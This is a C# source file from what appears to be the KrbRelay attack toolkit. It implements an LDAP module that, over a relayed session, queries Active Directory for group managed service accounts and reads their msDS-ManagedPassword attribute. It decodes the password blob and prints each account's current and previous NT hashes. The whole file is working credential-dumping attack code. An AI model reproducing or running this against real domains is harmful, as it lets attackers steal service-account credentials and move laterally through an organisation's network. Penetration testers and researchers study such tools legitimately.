using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using static KrbRelay.Natives;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class gMSA
    {
        public static void read(IntPtr ld, string gMsaUser = "")
        {
            var timeout = new LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
            };
            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
            var controlPtr = Marshal.StringToHGlobalUni("msDS-ManagedPassword");
            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);

            int search = 0;
            if (string.IsNullOrEmpty(gMsaUser))
            {
                search = ldap_search(
                    ld,
                    $"{Program.domainDN}",
                    (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
                    "(&(objectClass=msDS-GroupManagedServiceAccount))",
                    pLaps,
                    0);
            }
            else
            {
                search = ldap_search(
                    ld,
                    $"{Program.domainDN}",
                    (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
                    String.Format("(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={0}))", gMsaUser.ToUpper()),
                    pLaps,
                    0);
            }
            //Console.WriteLine("[*] msgID: {0}", search);

            IntPtr pMessage = IntPtr.Zero;
            var r = Natives.ldap_result(
                ld,
                search,
                1,
                timeout,
                ref pMessage);
            Console.WriteLine("[*] ldap_result: {0}", (LdapResultType)r);
            Dictionary<string, Dictionary<string, List<byte[]>>> result = new Dictionary<string, Dictionary<string, List<byte[]>>>();
            var ber = Marshal.AllocHGlobal(IntPtr.Size);
            for (var entry = ldap_first_entry(ld, pMessage); entry != IntPtr.Zero; entry = Natives.ldap_next_entry(ld, entry))
            {
                string dn = Generic.GetLdapDn(ld, entry);
                Dictionary<string, List<byte[]>> aa = Generic.GetLdapAttributes(ld, entry, ref ber);
                var managedPassword = new MsDsManagedPassword(aa.Values.SelectMany(a => a).ToArray().SelectMany(a => a).ToArray());
                Console.WriteLine("Username: {0}", dn);
                Console.WriteLine("NT hash: {0}", Helpers.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, managedPassword.CurrentPassword));
                Console.WriteLine("PasswordGoodUntil: {0}", managedPassword.PasswordGoodUntil.ToString());
                if (managedPassword.OldPassword != null)
                    Console.WriteLine("Old NT hash: {0}", Helpers.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, managedPassword.OldPassword));
                Console.WriteLine();
            }
            return;
        }
    }

    // https://github.com/rvazarkar/GMSAPasswordReader/blob/master/MsDsManagedPassword.cs
    internal class MsDsManagedPassword
    {
        internal short Version { get; set; }
        internal string CurrentPassword { get; set; }
        internal string OldPassword { get; set; }
        internal DateTime NextQueryTime { get; set; }
        internal DateTime PasswordGoodUntil { get; set; }

        internal MsDsManagedPassword(byte[] blob)
        {
            using (var stream = new MemoryStream(blob))
            {
                using (var reader = new BinaryReader(stream))
                {
                    Version = reader.ReadInt16();
                    reader.ReadInt16();

                    var length = reader.ReadInt32();

                    if (length != blob.Length)
                    {
                        throw new Exception("Missized blob");
                    }

                    var curPwdOffset = reader.ReadInt16();
                    CurrentPassword = GetUnicodeString(blob, curPwdOffset);

                    var oldPwdOffset = reader.ReadInt16();
                    if (oldPwdOffset > 0)
                    {
                        OldPassword = GetUnicodeString(blob, oldPwdOffset);
                    }

                    var queryPasswordIntervalOffset = reader.ReadInt16();
                    var queryPasswordIntervalTicks = BitConverter.ToInt64(blob, queryPasswordIntervalOffset);
                    NextQueryTime = DateTime.Now + TimeSpan.FromTicks(queryPasswordIntervalTicks);

                    var unchangedPasswordIntervalOffset = reader.ReadInt16();
                    var unchangedPasswordIntervalTicks = BitConverter.ToInt64(blob, unchangedPasswordIntervalOffset);
                    PasswordGoodUntil = DateTime.Now + TimeSpan.FromTicks(unchangedPasswordIntervalTicks);
                }
            }
        }

        private string GetUnicodeString(byte[] blob, int index)
        {
            var stOut = "";

            for (var i = index; i < blob.Length; i += 2)
            {
                var ch = BitConverter.ToChar(blob, i);
                if (ch == char.MinValue)
                {
                    //found the end  .    A null-terminated WCHAR string
                    return stOut;
                }
                stOut += ch;
            }

            return null;
        }
    }
}